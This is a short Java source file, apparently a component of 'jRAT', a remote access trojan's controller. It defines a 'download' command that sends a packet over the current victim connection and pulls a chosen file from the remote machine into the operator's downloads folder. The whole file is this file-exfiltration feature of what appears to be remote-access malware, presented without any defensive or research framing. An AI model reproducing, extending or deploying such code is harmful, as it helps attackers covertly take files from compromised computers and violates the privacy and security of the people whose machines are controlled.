package net.jrat.core.command.commands.connection;

import java.io.File;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.packet.server.S6PacketDownload;
import net.jrat.utils.Variables;

public class Download extends Command
{
	public Download()
	{
		super("download", new String[] { "fpath", "opath" }, new String[] { "sets the filepath", "sets the outputpath" }, "downloads a specified file");
	}

	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		if(this.server.currentConnection == null)
			throw new Exception("current connection is equal to null");

		final String fpath = commandLine.getOptionValue("fpath", null);
		
		if(fpath == null)
			throw new Exception("filepath is needed");
		
		final String opath = commandLine.getOptionValue("opath", Variables.instance.workDir + "downloads" + File.separator + "downloaded.file");
		this.server.currentConnection.outputStream.writeObject(new S6PacketDownload(fpath, opath));
	}
}